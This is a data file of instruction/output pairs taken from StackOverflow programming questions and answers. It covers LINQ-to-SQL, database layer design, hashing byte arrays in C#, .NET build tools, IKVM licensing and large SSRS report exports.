{"instruction": "I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (http://stackoverflow.com/questions/8050/beginners-guide-to-linq), but had a follow-up question:\nWe're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.\nSo, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs? Any specific pro's or con's?\nThanks.", "output": "A DBA has no freedom to make changes\n  to the data model without forcing you\n  to change your compiled code. With\n  stored procedures, you can hide these\n  sorts of changes to an extent, since\n  the parameter list and results set(s)\n  returned from a procedure represent\n  its contract, and the innards can be\n  changed around, just so long as that\n  contract is still met.\n\nI really don't see this as being a benefit. Being able to change something in isolation might sound good in theory, but just because the changes fulfil a contract doesn't mean it's returning the correct results. To be able to determine what the correct results are you need context and you get that context from the calling code."}
{"instruction": "If you had to provide a wizard like form entry experience in mvc how would you abstract the page flow?", "output": "There are a couple ways, create an action for each step of the wizard process, or create a parameter that is passed in to the action method.  Like step that will allow you to know what the state of the wizard is in."}
{"instruction": "I've seen projects where the classes in the DB layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions. \nWhich is \"better\" and why?", "output": "It's all about the purpose of the DB Layer.\nIf you use an instance to access the DB layer, you are allowing multiple versions of that class to exist. This is desirable if you want to use the same DB layer to access multiple databases for example.\nSo you might have something like this:\nDbController acrhive = new DbController(\"dev\");\nDbController prod = new DbController(\"prod\");\n\nWhich allows you to use multiple instances of the same class to access different databases.\nConversely you might want to allow only one database to be used within your application at a time. If you want to do this then you could look at using a static class for this purpose."}
{"instruction": "I've seen projects where the classes in the DB layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions. \nWhich is \"better\" and why?", "output": "It depends which model you subscribe to.  ORM (Object Relational Model) or Interface Model.  ORM is very popular right now because of frameworks like nhibernate, LINQ to SQL, Entity Framework, and many others.  The ORM lets you customize some business constraints around your object model and pass it around with out actually knowing how it should be committed to the database.  Everything related to inserting, updating, and deleting happens in the object and doesn't really have to worry the developer too much.\nThe Interface Model like the Enterprise Data Pattern made popular by Microsoft, requires you to know what state your object is in and how it should be handled.  It also requires you to create the necessary SQL to perform the actions.\nI would say go with ORM."}
{"instruction": "I've seen projects where the classes in the DB layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions. \nWhich is \"better\" and why?", "output": "I like a single object to be correlated to a single record in the database, i.e. an object must be instantiated.  This is your basic ActiveRecord pattern.  In my experience, the one-object-to-one-row approach creates a much more fluid and literate presentation in code.  Also, I like to treat objects as records and the class as the table. For example to change the name of a record I do:\nobjPerson = new Person(id)\n\nobjPerson.name = \"George\"\n\nobjPerson.save()\n\nwhile to get all people who live in Louisiana I might do\naryPeople = Person::getPeopleFromState(\"LA\")\n\nThere are plenty of criticisms of Active Record.  You can especially run into problems where you are querying the database for each record or your classes are tightly coupled to your database, creating inflexibility in both.  In that case you can move up a level and go with something like DataMapper. \nMany of the modern frameworks and ORM's are aware of some of these drawbacks and provide solutions for them.  Do a little research and you will start to see that this is a problem that has a number of solutions and it all depend on your needs."}
{"instruction": "I've seen projects where the classes in the DB layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions. \nWhich is \"better\" and why?", "output": "As lomaxx mentioned, it's all about the purpose of the DB model.\nI find it best to use static classes, as I usually only want one instance of my DAL classes being created. I'd rather use static methods than deal with the overhead of potentially creating multiple instances of my DAL classes where only 1 should exist that can be queried multiple times."}
{"instruction": "I'm looking for a way to configure a DB connection at runtime; specifically using the Enterprise Library.  I see that there's a *.Data.Configuration (or something close to this ... don't recall off the top of my head) assembly but am finding not much on the interwebs.  Complicating matters is the fact that the API help is broken on Vista.\nNow, I found this work-around:\nConfiguration cfg = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);\nConnectionStringSettings connection = new ConnectionStringSettings();\nconnection.Name = \"Runtime Connection\";\nconnection.ProviderName = \"System.Data.OleDb\";\nconnection.ConnectionString = \"myconstring\";\ncfg.ConnectionStrings.ConnectionStrings.Add(connection);\ncfg.Save(ConfigurationSaveMode.Modified);\n\nConfigurationManager.RefreshSection(\"connectionStrings\");\nvar runtimeCon = DatabaseFactory.CreateDatabase(\"Runtime Connection\");\n\nAnd although it gives me what I want, it permanently edits the App.config. Sure I can go back and delete the changes, but I'd rather not go through this hassle.", "output": "Nope, you must save in order for the EntLib (and, I suspect, any other tool) to see the changes."}
{"instruction": "Once I've called DragManager.acceptDrag is there any way to \"unaccept\" the drag? Say that I have a view which can accept drag and drop, but only in certain areas. Once the user drags over one of these areas I call DragManager.acceptDrag(this) (from a DragEvent.DRAG_OVER handler), but if the user then moves out of this area I'd like to change the status of the drag to not accepted and show the DragManager.NONE feedback. However, neither calling DragManager.acceptDrag(null) nor DragManager.showFeedback(DragManager.NONE) seems to have any effect. Once I've accepted the drag an set the feedback type I can't seem to change it.\nJust to make it clear: the areas where the user should be able to drop are not components or even display objects, in fact they are just ranges in the text of a text field (like the selection). Had they been components of their own I could have solved it by making each of them accept drag events individually. I guess I could create proxy components that float over the text to emulate it, but I'd rather not if it isn't necessary.\n\nI've managed to get it working in both AIR and the browser now, but only by putting proxy components on top of the ranges of text where you should be able to drop things. That way I get the right feedback and drops are automatically unaccepted on drag exit.\nThis is the oddest thing about D&D in AIR:\nDragManager.doDrag(initiator, source, event, dragImage, offsetX, offsetY);\n\nIn browser-based Flex, offsetX and offsetY should be negative (so says the documentation, and it works fine). However, when running exactly the same code in AIR you have to make the offsets positive. The same numbers, but positive. That is very, very weird.\n\nI've tested some more and what @maclema works, but not if you run in AIR. It seems like drag and drop in AIR is different. It's really, really weird because not only is the feedback not showing correctly, and it's not possible to unaccept, but the coordinates are also completely off. I just tried my application in a browser instead of AIR and dragging and dropping is completely broken.\nAlso, skipping the dragEnter handler works fine in AIR, but breaks everything when running in a browser.", "output": "Yes, drag and drop is different in AIR. I HATE that! It takes a lot of playing around to figure out how to get things to work the same as custom dnd that was built in flex.\nAs for the coordinates, maybe play around with localToContent, and localToGlobal methods. They may help in translating the coordinates to something useful.\nGood luck. I will let you know if I think of anything else."}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 };\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "If you are looking for performance, I tested a few hash keys, and \nI recommend Bob Jenkin's hash function. It is both crazy fast\nto compute and will give as few collisions as the cryptographic\nhash you used until now.\nI don't know C# at all, and I don't know if it can link with C, but\nhere is its implementation in C."}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 };\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "The hash code of an object shouldn't be unique. \nThe checking rule is: \n\nAre the hash codes equal? Then call the full (slow) Equals method.\nAre the hash codes not equal? Then the two items are definitely not equal.\n\nAll you want is a GetHashCode algorithm that splits up your collection into roughly even groups - it shouldn't form the key as the HashTable or Dictionary<> will need to use the hash to optimise retrieval.\nHow long do you expect the data to be? How random? If lengths vary greatly (say for files) then just return the length.  If lengths are likely to be similar look at a subset of the bytes that varies.\nGetHashCode should be a lot quicker than Equals, but doesn't need to be unique.\nTwo identical things must never have different hash codes. Two different objects should not have the same hash code, but some collisions are to be expected (after all, there are more permutations than possible 32 bit integers)."}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 };\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "Is using the existing hashcode from the byte array field not good enough? Also note that in the Equals method you should check that the arrays are the same size before doing the compare."}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 };\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "Generating a good hash is easier said than done.  Remember, you're basically representing n bytes of data with m bits of information.  The larger your data set and the smaller m is, the more likely you'll get a collision ... two pieces of data resolving to the same hash.\nThe simplest hash I ever learned was simply XORing all the bytes together.  It's easy, faster than most complicated hash algorithms and a halfway decent general-purpose hash algorithm for small data sets.  It's the Bubble Sort of hash algorithms really.  Since the simple implementation would leave you with 8 bits, that's only 256 hashes ... not so hot.  You could XOR chunks instead of individal bytes, but then the algorithm gets much more complicated.\nSo certainly, the cryptographic algorithms are maybe doing some stuff you don't need ... but they're also a huge step up in general-purpose hash quality.  The MD5 hash you're using has 128 bits, with billions and billions of possible hashes.  The only way you're likely to get something better is to take some representative samples of the data you expect to be going through your application and try various algorithms on it to see how many collisions you get.\nSo until I see some reason to not use a canned hash algorithm (performance, perhaps?), I'm going to have to recommend you stick with what you've got."}
{"instruction": "What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? \nI'm interested in using OSGi in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using Spring Dynamic Modules for OSGi(tm) Service Platforms. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? \n@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first \"real\" OSGi bundle, as opposed to a Hello World example.\n@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?", "output": "I really like the Apache Felix tutorials. However, I think in general leveraging OSGi in your application isn't one of those \"let's use this framework, because it's hype\" decision. It's more of a design question, but then everything that OSGi gives you in terms of design, you can have with vanilla Java as well.\nAs for the runtime, you cannot just add an existing application and make it OSGi enabled. It needs to be design to be dynamic. Spring DM makes it easy to hide that from you, but it's still there and you need to be aware of it."}
{"instruction": "Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).\nHere's what I have today:\nstruct SomeData : IEquatable<SomeData>\n{\n    private readonly byte[] data;\n    public SomeData(byte[] data)\n    {\n        if (null == data || data.Length <= 0)\n        {\n            throw new ArgumentException(\"data\");\n        }\n        this.data = new byte[data.Length];\n        Array.Copy(data, this.data, data.Length);\n    }\n\n    public override bool Equals(object obj)\n    {\n        return obj is SomeData && Equals((SomeData)obj);\n    }\n\n    public bool Equals(SomeData other)\n    {\n        if (other.data.Length != data.Length)\n        {\n            return false;\n        }\n        for (int i = 0; i < data.Length; ++i)\n        {\n            if (data[i] != other.data[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n    public override int GetHashCode()\n    {\n        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);\n    }\n}\n\nAny thoughts?\n\ndp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).\nfor example:\nbyte[] b1 = new byte[] { 1 };\nbyte[] b2 = new byte[] { 1 };\nint h1 = b1.GetHashCode();\nint h2 = b2.GetHashCode();\n\nWith that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.", "output": "Have you compared with the SHA1CryptoServiceProvider.ComputeHash method? It takes a byte array and returns a SHA1 hash, and I believe it's pretty well optimized. I used it in an Identicon Handler that performed pretty well under load."}
{"instruction": "I was writing some ASP.NET control when I came to the scenario where I needed to remove items from a list, only when they matched a certain condition.\nThe RemoveAll method of the generic List class does a good job, but removes all items that match the condition, specified by the predicate.\nWhat if I want to only remove a certain number of items specifying the condition? What do you think is the best way to do this?", "output": "Unless the method provides a \"limit\" parameter (which it doesn't) your best option is to go with a simple loop that removes the items that match, breaking when your incremented \"match counter\" hits your limit.\nThat's pretty much how the internal function works anyway, but in a more optimized way."}
{"instruction": "I was writing some ASP.NET control when I came to the scenario where I needed to remove items from a list, only when they matched a certain condition.\nThe RemoveAll method of the generic List class does a good job, but removes all items that match the condition, specified by the predicate.\nWhat if I want to only remove a certain number of items specifying the condition? What do you think is the best way to do this?", "output": "In framework 3.5, RemoveAll method takes a predicate as a parameter. So you may use\nlist.RemoveAll(item => ShouldIRemoveThis(item));\n\nwhere ShouldIRemoveThis is a method that returns a boolean indicating whether the item must be removed from the list."}
{"instruction": "I was writing some ASP.NET control when I came to the scenario where I needed to remove items from a list, only when they matched a certain condition.\nThe RemoveAll method of the generic List class does a good job, but removes all items that match the condition, specified by the predicate.\nWhat if I want to only remove a certain number of items specifying the condition? What do you think is the best way to do this?", "output": "Can you use LINQ? If so, you can just use the .Take() method and specify how many records you want (maybe as total - N)."}
{"instruction": "I was writing some ASP.NET control when I came to the scenario where I needed to remove items from a list, only when they matched a certain condition.\nThe RemoveAll method of the generic List class does a good job, but removes all items that match the condition, specified by the predicate.\nWhat if I want to only remove a certain number of items specifying the condition? What do you think is the best way to do this?", "output": "Anonymous delegates are useful here. A simple example to remove the first limit even numbers from a list.\nList<int> myList = new List<int>;\nfor (int i = 0; i < 20; i++) myList.add(i);\n\nint total = 0;\nint limit = 5;\nmyList.RemoveAll(delegate(int i) { if (i % 2 == 0 && total < limit) { total++; return true; } return false; });\n\nmyList.ForEach(i => Console.Write(i + \" \"));\n\nGives 1 3 5 7 9 10 11 12 13 14 15 16 17 18 19, as we want. Easy enough to wrap that up in a function, suitable for use as a lambda expression, taking the real test as a parameter."}
{"instruction": "I was writing some ASP.NET control when I came to the scenario where I needed to remove items from a list, only when they matched a certain condition.\nThe RemoveAll method of the generic List class does a good job, but removes all items that match the condition, specified by the predicate.\nWhat if I want to only remove a certain number of items specifying the condition? What do you think is the best way to do this?", "output": "@buyutec\nInstead of\nlist.RemoveAll(item => ShouldIRemoveThis(item));\n\nyou can use:\nlist.RemoveAll(ShouldIRemoveThis);\n\nThe lambda has the same signature as the method, so they are equivalent so you can just pass the method directly."}
{"instruction": "I was writing some ASP.NET control when I came to the scenario where I needed to remove items from a list, only when they matched a certain condition.\nThe RemoveAll method of the generic List class does a good job, but removes all items that match the condition, specified by the predicate.\nWhat if I want to only remove a certain number of items specifying the condition? What do you think is the best way to do this?", "output": "If you want to specify both a limit for number of items to remove and a condition to select the items to remove, you can use this approach:\nint limit = 30; // Suppose you want to remove 30 items at most\nlist.RemoveAll(item => ShouldIRemoveThis(item) && limit-- > 0);"}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "The unit tester for VS2008 is only for .NET code as far as I know.\nI used CppUnit on Vs2005 and found it to be pretty good. \nAs far as I remember, the setup was relatively painless, just make sure that in your testing projects the linker (Linker->Input->Additional Dependencies) includes cppunitd.lib. \nThen, #include <cppunit/extensions/HelperMacros.h> in your header\nYou can then follow the steps in http://cppunit.sourceforge.net/doc/1.11.6/cppunit_cookbook.html to get your test class working."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "Generally speaking, I get the impression that NAnt offers more flexibility compared to MSBuild, whereas (with my relatively simple needs) I've been fine with the latter so far."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "We use MSBuild, because we started with Visual\u00a0Studio\u00a02005 (now Visual\u00a0Studio\u00a02008), and MSBuild was already \"built in\" to the SDK - there is less maintenance on the build server. It's a NAnt clone, really - both tools are infinitely flexible in that they let you create custom build tasks in code, and both have a decent set of community build tasks already created.\n\nMSBuild Community Tasks\nNAntContrib"}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "We actually use a combination of NAnt and MSBuild with CruiseControl. NAnt is used for script flow control and calls MSBuild to compile projects. After the physical build is triggered, NAnt is used to publish the individual project build outputs to a shared location.\nI am not sure this is the best process. I think many of us are still looking for a great build tool. One promising thing I heard recently on .NET Rocks, episode 362, is James Kovac's PSake, a build system he based entirely on PowerShell. It sounds really promising since what you can do with PowerShell is fairly limitless in theory."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "I've used both and prefer NAnt. It's really hard for me to say one is \"better\" than the other."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "I have used both MSBuild and NAnt, and I much prefer MSBuild, mainly because it requires a lot less configuration by default. Although you can over-complicate things and load MSBuild down with a lot of configuration junk too, at its simplest, you can just point it at a solution/project file and have it go which, most of the time, for most cases, is enough."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "It also depends on what you're building. The MSBuild SDC Task library has a couple of special tasks. For example, for AD, BizTalk, etc.\n\nThere are over 300 tasks included in\n  this library including tasks for:\n  creating websites, creating\n  application pools, creating\n  ActiveDirectory users, running FxCop,\n  configuring virtual servers, creating\n  zip files, configuring COM+, creating\n  folder shares, installing into the\n  GAC, configuring SQL Server,\n  configuring BizTalk 2004 and BizTalk\n  2006, etc."}
{"instruction": "Possible Duplicate:\nNAnt or MSBuild, which one to choose and when? \n\nWhat is the best build tool for .NET?\nI currently use NAnt but only because I have experience with Ant. Is MSBuild preferred?", "output": "I'd just like to throw FinalBuilder in to the mix. It's not free, but if you're fed up with editing XML files and want a somewhat nicer (IMO) environment to work in I would give it a go.\nI've worked with all of them and have always went back to FinalBuilder."}
{"instruction": "Every now and then in a high volume .NET application, you might see this exception when you try to execute a query:\n\nSystem.Data.SqlClient.SqlException:  A transport-level error has\n  occurred when sending the request to the server.\n\nAccording to my research, this is something that \"just happens\" and not much can be done to prevent it.  It does not happen as a result of a bad query, and generally cannot be duplicated.  It just crops up maybe once every few days in a busy OLTP system when the TCP connection to the database goes bad for some reason.\nI am forced to detect this error by parsing the exception message, and then retrying the entire operation from scratch, to include using a new connection.  None of that is pretty.\nAnybody have any alternate solutions?", "output": "You should also check hardware connectivity to the database.\nPerhaps this thread will be helpful:\nhttp://channel9.msdn.com/forums/TechOff/234271-Conenction-forcibly-closed-SQL-2005/"}
{"instruction": "I've seen projects where the classes in the DB layer have just static functions in them and other projects where those classes need to be instantiated to get access to the member functions. \nWhich is \"better\" and why?", "output": "I would say that it depends on what you want the \"DB layer\" to do...\nIf you have general routines for executing a stored procedure, or sql statement, that return a dataset, then using static methods would make more sense to me, since you don't need a permanent reference to an object that created the dataset for you.\nI'd use a static method as well if I created a DB Layer that returned a strongly-typed class or collection as its result.\nIf on the other hand you want to create an instance of a class, using a given parameter like an ID (see @barret-conrad's answer), to connect to the DB and get the necessary record, then you'd probably not want to use a static method on the class.  But even then I'd say you'd probably have some sort of DB Helper class that DID have static methods that your other class was relying on."}
{"instruction": "I have been looking into IKVMing Apache's FOP project to use with our .NET app.  It's a commercial product, and looking into licensing, IKVM runs into some sticky areas because of its use of GNU Classpath.  From what I've seen, no one can say for sure if this stuff can be used in a commercial product.  Has anyone used IKVM, or an IKVM'd product, in a commercial product?  Here's what I've found so far:\nIKVM license page, which notes that one dll contains code from other projects, their license GPLv2 + Classpath Exception\nSaxon for .NET is generated with IKVM, but released under the Apache license...\nAnyone have experience with this?", "output": "There are multiple issues here as ikvm is currently being transitioned away from the GNU classpath system to Sun's OpenJDK.  Both are licensed as GPL+Exceptions to state explicitly that applications which merely use the OpenJDK libraries will not be considered derived works.\nGenerally speaking, applications which rely upon components with defined specs such as this do not fall under the GPL anyway.  For example, linking against public POSIX APIs does not trigger GPL reliance in a Linux application, despite the kernel being GPL.  A similar principal will usually (the details can be tricky) apply to replacing Sun's Java with a FOSS/GPL implementation."}
{"instruction": "First off I understand that it is a horrible idea to run extremely large/long running reports. I am aware that Microsoft has a rule of thumb stating that a SSRS report should take no longer than 30 seconds to execute.  However sometimes gargantuan reports are a preferred evil due to external forces such complying with state laws.\nAt my place of employment, we have an asp.net (2.0) app that we have migrated from Crystal Reports to SSRS. Due to the large user base and complex reporting UI requirements we have a set of screens that accepts user inputted parameters and creates schedules to be run over night. Since the application supports multiple reporting frameworks we do not use the scheduling/snapshot facilities of SSRS. All of the reports in the system are generated by a scheduled console app which takes user entered parameters and generates the reports with the corresponding reporting solutions the reports were created with. In the case of SSRS reports, the console app generates the SSRS reports and exports them as PDFs via the SSRS web service API. \nSo far SSRS has been much easier to deal with than Crystal with the exception of a certain 25,000 page report that we have recently converted from crystal reports to SSRS. The SSRS server is a 64bit 2003 server with 32 gigs of ram running SSRS 2005. All of our smaller reports work fantastically, but we are having trouble with our larger reports such as this one.  Unfortunately, we can't seem to generate the aforemention report through the web service API. The following error occurs roughly 30-35 minutes into the generation/export:\nException Message: The underlying connection was closed: An unexpected error occurred on a receive.\nThe web service call is something I'm sure you all have seen before:  \ndata = rs.Render(this.ReportPath, this.ExportFormat, null, deviceInfo,\n   selectedParameters, null, null, out encoding, out mimeType, out usedParameters, \n   out warnings, out streamIds);\n\nThe odd thing is that this report will run/render/export if the report is run directly on the reporting server using the report manager. The proc that produces the data for the report runs for about 5 minutes. The report renders in SSRS native format in the browser/viewer after about 12 minutes. Exporting to pdf through the browser/viewer in the report manager takes an additional 55 minutes. This works reliably and it produces a whopping 1.03gb pdf.\nHere are some of the more obvious things I've tried to get the report working via the web service API:  \n\nset the HttpRuntime ExecutionTimeout\nvalue to 3 hours on the report\nserver\ndisabled http keep alives on the report server\nincreased the script timeout on the report server\nset the report to never time out on the server\nset the report timeout to several hours on the client call  \n\nFrom the tweaks I have tried, I am fairly comfortable saying that any timeout issues have been eliminated. \nBased off of my research of the error message, I believe that the web service API does not send chunked responses by default. This means that it tries to send all 1.3gb over the wire in one response. At a certain point, IIS throws in the towel. Unfortunately the API abstracts away web service configuration so I can't seem to find a way to enable response chunking. \n\nDoes anyone know of anyway to reduce/optimize the PDF export phase and or the size of the PDF without lowering the total page count?\nIs there a way to turn on response chunking for SSRS?\nDoes anyone else have any other theories as to why this runs on the server but not through the API?\n\nEDIT: After reading kcrumley's post I began to take a look at the average page size by taking file size / page count. Interestingly enough on smaller reports the math works out so that each page is roughly 5K. Interestingly, when the report gets larger this \"average\" increases. An 8000 page report for example is averaging over 40K/page. Very odd. I will also add that the number of records per page is set except for the last page in each grouping, so it's not a case where some pages have more records than another.", "output": "Does anyone know of anyway to\n  reduce/optimize the PDF export phase\n  and or the size of the PDF without\n  lowering the total page count?\n\n\nI have a few ideas and questions:\n1. Is this a graphics-heavy report?  If not, do you have tables that start out as text but are converted into a graphic by the SSRS PDF renderer (check if you can select the text in the PDF)?  41K per page might be more than it should be, or it might not, depending on how information-dense your report is.  But we've had cases where we had minor issues with a report's layout, like having a table bleed into the page's margins, that resulted in the SSRS PDF renderer \"throwing up its hands\" and rendering the table as an image instead of as text.  Obviously, the fewer graphics in your report, the smaller your file size will be.\n2. Is there a way that you could easily break the report into pieces?  E.g., if it's a 10-location report, where Location 1 is followed by Location 2, etc., on your final report, could you run the Location 1 portion independent of the Location 2 portion, etc.?  If so, you could join the 10 sub-reports into one final PDF using PDFSharp after you've received them all.  This leads to some difficulties with page numbering, but nothing insurmountable.\n\n3. Does anyone else have any other\n  theories as to why this runs on the\n  server but not through the API?\n\nMy guess would be the sheer size of the report.  I don't remember everything about what's an IIS setting and what's SSRS-specific, but there might be some overall IIS settings (maybe in Metabase.xml) that you would have to be updated to even allow that much data to pass through. \nYou could isolate the question of whether the time is the problem by taking one of your working reports and building in a long wait time in your stored procedures with WAITFOR (assuming SQL Server for your DBMS).\nNot solutions, per se, but ideas.  Hope it helps."}
